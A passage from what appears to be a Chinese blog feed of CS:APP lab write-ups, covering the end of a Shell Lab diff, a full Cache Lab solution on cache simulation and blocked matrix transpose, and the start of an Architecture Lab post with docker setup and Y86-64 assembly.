+<span class="number">361</span>,<span class="number">19</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)&#123;</span><br><span class="line">             jid = string2num(argv[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">             select_job = getjobjid(jobs, jid);</span><br><span class="line">+            <span class="keyword">if</span>(select_job == <span class="literal">NULL</span>)&#123;</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">+                <span class="keyword">return</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">             pid = select_job-&gt;pid;</span><br><span class="line">         &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 如果是以 pid 方式标识</span></span><br><span class="line">             pid = string2num(argv[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">             select_job = getjobpid(jobs, pid);</span><br><span class="line">+            <span class="keyword">if</span> (select_job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"(%s): No such process\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">+                <span class="keyword">return</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">             jid = select_job-&gt;jid;</span><br><span class="line">         &#125;</span><br><span class="line">         sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br></pre></td></tr></table></figure>

<h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p>在这个测试中，就是整合一起测试，我突然发现，命令找不到时候，输出语句，多了个字符，修改一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-196</span>,<span class="number">7</span> +<span class="number">196</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line">             sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">             setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">             <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">-                <span class="built_in">printf</span>(<span class="string">"%s: Command not found.\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"%s: Command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>

<h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p>在这个测试中，检查我们的<code>tsh</code>程序能否可以正确处理来自其他进程的<code>SIGSTP</code>和<code>SIGINT</code>信号</p>
<h2 id="完成代码"><a href="#完成代码" class="headerlink" title="完成代码"></a>完成代码</h2><p>请移步<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Shell-Lab/tsh.c" target="_blank" rel="noopener">【仓库】</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本实验涉及内容比较多，建议先看几遍教材的第8章，然后再做实验，对照着书来做。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>信号</tag>
        <tag>任务调度</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Cache Lab</title>
    <url>/2023/10/03/CS-APP-Cache-Lab/</url>
    <content><![CDATA[<p>实验包括两个小实验，第一个是仿真Cache，第二个是针对不同情况下，用不同的方式实现矩阵转置。</p>
<p>话不多说，打开电脑，带上键盘，开启实验！<a id="more"></a></p>
<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part-A"></a>Part-A</h2><p>第一部分要求我们模拟一个缓存模块，使得其能够计算在给定缓存信息后，面对特定的访存序列，给出最终总的缓存名中、缓存缺失和缓存冲突（替换）的数量。</p>
<p>缓存的信息如下给出：</p>
<ul>
<li><code>s</code>：表明有$2^s$个组</li>
<li><code>E</code>：每组有<code>E</code>个缓存行</li>
<li><code>b</code>：块的大小是$2^b$个位（好像是字节，不是位，我是按照字节来处理的）</li>
</ul>
<p>访存序列由文件给出，该文件中由若干行组成，每行由以下形式组成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure>

<p><code>operation</code>为以下四者之一：</p>
<ul>
<li><p>I：指令加载（我们不需要处理该类型）</p>
</li>
<li><p>M：数据修改</p>
</li>
<li><p>L：数据加载</p>
</li>
<li><p>S：数据保存</p>
</li>
</ul>
<p>在本实验中，我们只关心<code>operation</code>和<code>address</code>，而且，我们还有以下两个有用的点：</p>
<ul>
<li><p>L或者S最多造成1个”缓存不命中“</p>
</li>
<li><p>数据修改M可以视为数据加载，然后存储到同一个地址，因此一个M操作可以造成下面两种情况：</p>
<ul>
<li>①：两个命中</li>
<li>②：一个不命中和一个名中（可能还有一个替换）</li>
</ul>
</li>
</ul>
<p>由于我们需要设计一个通用的，即能够处理任意合理的<code>s-E-b</code>组合，因此我们不能够在代码中用数组进行固定缓存组数或者行数，而应该使用<strong>链表</strong>。</p>
<p>首先，对于缓存，必然是由若干组组成，为了方便，我们要记下缓存总的组数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheStruct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> groupCnt;</span><br><span class="line">	<span class="comment">// 指向第一组    </span></span><br><span class="line">    GroupItem* groupItemHead;</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<p>而对于每一组，同样为了方便，我们要记下该组内有多少行（当然我们也可以在结构体<code>Cache</code>中记录，因为每组内的行数肯定是一样的），我们要记录下该组内用了几行（用于快速判断组内是否已经满了从而进行替换操作），由于我们发生冲突是，使用的是<code>LRU</code>（最近最少使用）策略进行替换，我们还需要记录每行最后一次被访问的时间戳，因此我们可以给每组加一个时钟，因此每个组的结构可以设计成如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GroupStruct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> lineCnt;</span><br><span class="line">    <span class="keyword">int</span> used;</span><br><span class="line">    <span class="keyword">int</span> clock;</span><br><span class="line">    <span class="comment">// 指向改组内的第一行</span></span><br><span class="line">    LineItem* lineItemHead;</span><br><span class="line">    <span class="comment">// 指向下一组 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">GroupStruct</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;GroupItem;</span><br></pre></td></tr></table></figure>

<p>而对于每一行，我们要设置一个id，以及有效位，块的大小（也可以在结构体<code>Cache</code>中记录），以及最后一次访问的时间戳：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LineItemStruct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> valid;</span><br><span class="line">    <span class="keyword">int</span> blockSize;</span><br><span class="line">    <span class="keyword">int</span> insertClock;</span><br><span class="line">    <span class="comment">// 指向下一行</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LineItemStruct</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; LineItem;</span><br></pre></td></tr></table></figure>

<p>设计好这些数据后，完整的代码就呼之欲出了，由于代码比较冗长，大家可以到<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Cache-Lab/csim.c" target="_blank" rel="noopener">【GitHub】</a>上参考</p>
<p>值得注意的是，处理L和S的逻辑是一样的，因为都是要先判断缓存中存不存在，不存在则加载进来，最后不管怎么样，都会更新时钟，因此可以把这两个处理函数合二为一，但是为了体现模块化思想，我还是保留了。</p>
<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./test-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">TEST_CSIM_RESULTS=27</span><br></pre></td></tr></table></figure>

<h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part-B"></a>Part-B</h2><p>上面的实验是开胃菜，只要有一些程序设计思想的应该都能做出来，该部分的实验才是需要花点时间的。</p>
<p>我们先来一个最简单的，将<code>transpose_submit</code>改为下面的逻辑：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时只注册我们的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerFunctions</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Register your solution function */</span></span><br><span class="line">    registerTransFunction(transpose_submit, transpose_submit_desc); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register any additional transpose functions */</span></span><br><span class="line"><span class="comment">//    registerTransFunction(trans, trans_desc); </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./test-trans -M 32 -N 32</span><br><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:869, misses:1184, evictions:1152</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1184</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1184</span><br></pre></td></tr></table></figure>

<p>我们可以看到，没有任何优化的情况下，缓存缺失有<code>1184</code>次，离目标<code>&lt;300</code>还很远。</p>
<p>我们再来看看访存情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./csim-ref -v -s 5 -E 1 -b 5 -t trace.f0 &gt; debug.txt</span><br><span class="line">cat debug.txt</span><br><span class="line">S 10c080,1 miss </span><br><span class="line">L 18c0c0,8 miss </span><br><span class="line">L 18c0a4,4 miss </span><br><span class="line">L 18c0a0,4 hit </span><br><span class="line">L 10c0a0,4 miss eviction </span><br><span class="line">S 14c0a0,4 miss eviction </span><br><span class="line">L 10c0a4,4 miss eviction </span><br><span class="line">S 14c120,4 miss </span><br><span class="line">L 10c0a8,4 hit </span><br><span class="line">S 14c1a0,4 miss </span><br><span class="line">L 10c0ac,4 hit </span><br><span class="line">S 14c220,4 miss </span><br><span class="line">L 10c0b0,4 hit </span><br><span class="line">S 14c2a0,4 miss </span><br><span class="line">L 10c0b4,4 hit </span><br><span class="line">S 14c320,4 miss </span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>从结果来看，我们知道了两个数组之间的地址差为<code>0x14c0a0-0x10c0a0=0x40000</code>.</p>
<p>此外，我们还知道s=5,E=1,b=5,即一共32组，每组一行，每块2^5=32字节,即一个块可以放8个int类型数据。</p>
<p>对于一个32位地址，会按照下面的格式进行解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------------------------------------------------------</span><br><span class="line">|  id(22-bit) | groupId(5-bit) | block-offset(5-bit) |</span><br><span class="line">------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>意味着代码中的A数组起始地址和B数组起始地址都会被映射到同一组，准确来说，对于地址<code>&amp;A[i][j]</code>和<code>&amp;B[i][j]</code>都会被映射到同一组，但是对应的id不同。数组A和数组B元素对应的组号大致如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A || B:</span><br><span class="line">0...0 1...1 2..2 3...3</span><br><span class="line">4...4 ................</span><br><span class="line">8...8 ................</span><br><span class="line">12...12 ................</span><br><span class="line">16...16 ................</span><br><span class="line">20...20 ................</span><br><span class="line">24...44 ................</span><br><span class="line">28...28 ................</span><br></pre></td></tr></table></figure>

<p>即<code>groupID_A[0][0]=groupID_B[0][0]=0</code>，<code>groupID_A[1][0]=groupID_B[1][0]=4</code></p>
<p>因此我们应该尽量避免访问完数组A后立马访问数组B，避免将刚刚加载进缓存的数据因为冲突而被替换出去，由于每行可以放8个元素，因此如果我们可以保障连续读取的8个数字在同一组是最好的情况，因此我们可以将数组分块遍历。此外，我们的局部变量个数比较少的时候，会使用寄存器保存他们，引用它们不会对缓存造成影响，因此我们要善于利用局部变量。</p>
<h3 id="32-32"><a href="#32-32" class="headerlink" title="32*32"></a>32*32</h3><p>我们可以分块成8*8的矩阵，一开始的时候，我们可以一次性读取A数组的8个数字（<code>A[0][0]~A[0][7]</code>），因为这8个数字都是在同一行，读取完后缓存情况如下，绿色代表在缓存中，每个数字代表该元素对应的组号</p>
<p><img src="https://cdn.yalexin.top/image-20230922161616482.png" alt="image-20230922161616482"></p>
<p>下一步就是进行转置操作，由于数组B和数组A对应位置的元素将会映射到同一组，因此缓存中会先进行替换，再逐一加载进缓存，第一次转置完毕后， 缓存中都是数组B的元素：</p>
<p><img src="https://cdn.yalexin.top/image-20230922162712713.png" alt="image-20230922162712713"></p>
<p>下图表示转置情况，黄色代表转置完毕：</p>
<p><img src="https://cdn.yalexin.top/image-20230922162905389.png" alt="image-20230922162905389"></p>
<p><strong>接下来是重点了</strong>，由于我们缓存中有大量的数组B的数据，我们应该利用这点，我们先读取<code>A[1][1]~A[1][7]</code>共7个数字，此时会发生一次缓存替换，先不管，然后将这些数据进行转置，转置过程只会在保存<code>B[1][1]</code>时候发生缓存替换，后面<code>B[2][1]~B[7][1]</code>都缓存命中，转置后的情况为：</p>
<p><img src="https://cdn.yalexin.top/image-20230922164403227.png" alt="image-20230922164403227"></p>
<p>按照这个思路，继续完成这个小矩阵剩余部分，再转到下一个小矩阵即可，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (M == <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7, tmp8;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> bi = <span class="number">0</span>; bi &lt; <span class="number">4</span>; bi++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> bj = <span class="number">0</span>; bj &lt; <span class="number">4</span>; bj++) &#123;</span><br><span class="line">                <span class="comment">// 上面是迭代分块矩阵的逻辑（32 / 8 = 4）</span></span><br><span class="line">                <span class="comment">// 下面是小矩阵内从按行进行</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">                    tmp1 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span>];</span><br><span class="line">                    tmp2 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">                    tmp3 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">2</span>];</span><br><span class="line">                    tmp4 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">3</span>];</span><br><span class="line">                    tmp5 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">4</span>];</span><br><span class="line">                    tmp6 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">5</span>];</span><br><span class="line">                    tmp7 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">6</span>];</span><br><span class="line">                    tmp8 = A[bi * <span class="number">8</span> + k][bj * <span class="number">8</span> + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[bj * <span class="number">8</span>][bi * <span class="number">8</span> + k] = tmp1;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">1</span>][bi * <span class="number">8</span> + k] = tmp2;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">2</span>][bi * <span class="number">8</span> + k] = tmp3;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">3</span>][bi * <span class="number">8</span> + k] = tmp4;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">4</span>][bi * <span class="number">8</span> + k] = tmp5;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">5</span>][bi * <span class="number">8</span> + k] = tmp6;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">6</span>][bi * <span class="number">8</span> + k] = tmp7;</span><br><span class="line">                    B[bj * <span class="number">8</span> + <span class="number">7</span>][bi * <span class="number">8</span> + k] = tmp8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line"> ./test-trans -M 32 -N 32</span><br><span class="line"> Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1765, misses:288, evictions:256</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=288</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:288</span><br></pre></td></tr></table></figure>

<p>低于300，满足测试要求。</p>
<h3 id="64-64"><a href="#64-64" class="headerlink" title="64*64"></a>64*64</h3><p>如果我们仍然以分块的方式进行，由于前4行和后4行都映射到同一组，我们只能以4*4的分块方式：</p>
<p><img src="https://cdn.yalexin.top/image-20230922202026860.png" alt="image-20230922202026860"></p>
<p>但是很遗憾，按照4*4的逻辑，我们只能拿一点分：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./test-trans -M 64 -N 64</span><br><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:6497, misses:1700, evictions:1668</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1700</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1700</span><br></pre></td></tr></table></figure>

<p>距离1300还有一定差距。</p>
<p>进一步优化的代码我实在想不出了，参考了<a href="https://zhuanlan.zhihu.com/p/484657229" target="_blank" rel="noopener">【别人的做法】</a>：</p>
<p>仍然是考虑8*8，但是在8*8中，又继续分4*4，处理过程如下：</p>
<ul>
<li>第一步，利用局部变量将<code>A</code>的左上和右上一次性复制给<code>B</code>，处理完成后，缓存中是B的左上和右上部分</li>
<li>第二步，用本地变量把<code>B</code>的右上角存储下来，此时缓存名中</li>
<li>第三步，将<code>A</code>的左下复制给<code>B</code>的右上</li>
<li>第四步，利用上述存储<code>B</code>的右上角的本地变量，把<code>A</code>的右上复制给<code>B</code>的左下</li>
<li>第五步，把<code>A</code>的右下复制给<code>B</code>的右下</li>
</ul>
<p>由于这部分不是我写的，代码就参照<a href="https://github.com/YaleXin/CS-APP3e-Labs/blob/main/Cache-Lab/trans.c" target="_blank" rel="noopener">【GitHub】</a>即可</p>
<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line"> ./test-trans -M 64 -N 64</span><br><span class="line"> </span><br><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:9017, misses:1228, evictions:1196</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1228</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1228</span><br></pre></td></tr></table></figure>

<p>低于1300，达到要求！</p>
<h3 id="61-67"><a href="#61-67" class="headerlink" title="61*67"></a>61*67</h3><p>由于不是方阵，因此想要愉快地进行优化，没啥路子，而且数组A和数组B对应位置不一定会映射到同一组，真要优化起来，估计很复杂，试一下暴力破解！从8*8开始，到16*16，最后发现16*16的方式可以通过：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">16</span>)</span><br><span class="line">            <span class="comment">// 要注意不能超出边界N 下面的循环同理</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt; i + <span class="number">16</span> &amp;&amp; k &lt; N; k++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> l = j; l &lt; j + <span class="number">16</span> &amp;&amp; l &lt; M; l++)</span><br><span class="line">                    B[l][k] = A[k][l];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Function 0 (1 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:6186, misses:1993, evictions:1961</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1993</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:1993</span><br></pre></td></tr></table></figure>

<p>低于2000，满足条件！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遍历数组时候，尽量以行的方式进行，因为我们可以最大化利用缓存。</p>
<hr>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>性能调优</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Architecture Lab（未完待续）</title>
    <url>/2023/10/02/CS-APP-Architecture-Lab/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本实验要求我们学会涉及和实现一个流水线化的Y86-64处理器，至于为什么叫Y86-64，可能是想致敬x86-64吧。</p>
<p>同时我们还要优化该处理器。</p>
<p>本次实验主要分为三大部分，在A部分中，主要是编写一些Y86-64汇编程序，在B部分中，我们要扩展SEQ模拟器，A和B将作为C部分的基础，C部分是本实验的重点，在里边，我们要优化 Y86-64 基准程序和处理器设计。</p>
<p>话不多说，打开电脑，带上键盘，开启实验！<a id="more"></a></p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>本实验的环境搭建有点复杂，这里我直接用别人装好的<code>docker</code>环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 拉取镜像</span></span><br><span class="line">docker pull linxi177229/csapp:latest</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建容器</span></span><br><span class="line">docker run --name csapp -itd linxi177229/csapp </span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入容器</span></span><br><span class="line">docker exec -it csapp /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入工作目录</span></span><br><span class="line">cd ~/csapplab/</span><br><span class="line">ls</span><br><span class="line">archlab  attacklab  bomblab  cachelab  datalab  malloclab  proxylab  shlab</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入本实验</span></span><br><span class="line">cd archlab</span><br><span class="line">cd  archlab-handout/sim/</span><br><span class="line">make clean; make</span><br></pre></td></tr></table></figure>

<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part-A"></a>Part-A</h2><p>这一部分的主要在目录<code>sim/misc</code>中</p>
<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>第一个小实验是我们要编写一个sum.ys汇编文件，用于迭代链表求和，实现逻辑参照<code>example.c</code>中<code>sum_list</code>函数，值得注意的是，我们要编写一个完整的程序，意味着我们还要做初始化堆栈，调用函数后进行停机操作。</p>
<p>我们可以参考原书第三版的251页和252页的图4-6和图4-7，完成下面的程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sum.ys</span><br><span class="line">.pos 0</span><br><span class="line">        irmovq stack, %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line">main:</span><br><span class="line">		irmovq ele1,%rdi</span><br><span class="line">		call sum_list</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">		# rbx会在下面使用，因此要借助堆栈保护起来</span><br><span class="line">		pushq %rbx</span><br><span class="line">		# long val &#x3D; 0</span><br><span class="line">        xorq %rax,%rax</span><br><span class="line">loop:</span><br><span class="line">		# while (ls) </span><br><span class="line">        andq %rdi,%rdi</span><br><span class="line">        je exit_</span><br><span class="line">        # val +&#x3D; ls-&gt;val</span><br><span class="line">        mrmovq (%rdi),%rbx</span><br><span class="line">        addq %rbx,%rax</span><br><span class="line">        # ls &#x3D; ls-&gt;next</span><br><span class="line">        mrmovq 8(%rdi),%rdi</span><br><span class="line">        jmp loop</span><br><span class="line">exit_:</span><br><span class="line">		# 返回前从堆栈中恢复rbx</span><br><span class="line">		popq %rbx</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> ./yas sum.ys &amp;&amp; ./yis sum.yo</span><br><span class="line">Stopped in 30 steps at PC = 0x13.  Status 'HLT', CC Z=1 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line"><span class="meta">%</span><span class="bash">rax:   0x0000000000000000      0x0000000000000cba</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rsp:   0x0000000000000000      0x0000000000000200</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>

<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>第二个小实验还是迭代求和，只不过求和方式使用了递归方式，在汇编中使用递归的时候要记得递归调用前要保存可能会覆盖的寄存器，例如在函数中<code>rsum_list</code>，由于<code>rax</code>用于保存本轮调用的返回值，但是它也是作为下一轮递归调用的返回值，因此递归调用前，我们要通过其他寄存器先保存当前的<code>rax</code>（当然你也可以通过堆栈保存）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># rsum.ys</span><br><span class="line">.pos 0</span><br><span class="line">        irmovq stack, %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line">main:</span><br><span class="line">		irmovq ele1,%rdi</span><br><span class="line">		call rsum_list</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">		pushq %rbx</span><br><span class="line">		pushq %rcx</span><br><span class="line">        xorq %rax,%rax</span><br><span class="line">		# if (!ls)</span><br><span class="line">        andq 